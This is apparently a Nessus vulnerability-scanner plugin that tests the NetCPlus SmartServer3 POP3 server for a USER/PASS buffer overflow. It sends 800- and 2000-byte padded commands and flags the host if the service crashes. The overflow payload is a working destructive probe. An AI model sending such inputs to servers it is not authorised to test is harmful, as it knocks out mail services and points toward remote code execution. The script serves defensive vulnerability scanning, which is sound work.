#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID
#

include( 'compat.inc' );

if(description)
{
  script_id(10257);
  script_version ("$Revision: 1.18 $");
  script_bugtraq_id(790);
  script_xref(name:"OSVDB", value:"57175");

  script_name(english:"NetCPlus SmartServer3 POP3 (NCPOPSERV.EXE) USER Command Remote Overflow");
  script_summary(english:"Attempts to overflow the in.pop3d buffers");

  script_set_attribute(
    attribute:'synopsis',
    value:"The remote mail server is vulnerable to a buffer overflow."
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote pop3 server seems vulnerable to a buffer overflow when issued a
very long command.

This *may* allow an attacker to execute arbitrary commands
as root on the remote POP3 server."
  );

  script_set_attribute(
    attribute:'solution',
    value:"Contact your vendor for a patch or upgrade."
  );

  script_set_attribute(
    attribute:'see_also',
    value:"http://seclists.org/bugtraq/1999/Nov/149"
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C'
  );

  script_end_attributes();
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);
port = get_kb_item("Services/pop3");
if(!port)port = 110;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = recv_line(socket:soc, length:4096);
  if(!r)exit(0);
  if ( "smart" >!< tolower(r)) exit(0);

  c = string("USER ", crap(800), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  c = string("PASS ", crap(2000), "\r\n");
  send(socket:soc, data:c);
  d = recv_line(socket:soc, length:1024);
  if(!d)
    {
    security_hole(port);
    }
  else {
    soc2 = open_sock_tcp(port);
    if(!soc2)security_hole(port);
    else close(soc2);
    }
 close(soc);
 }
}
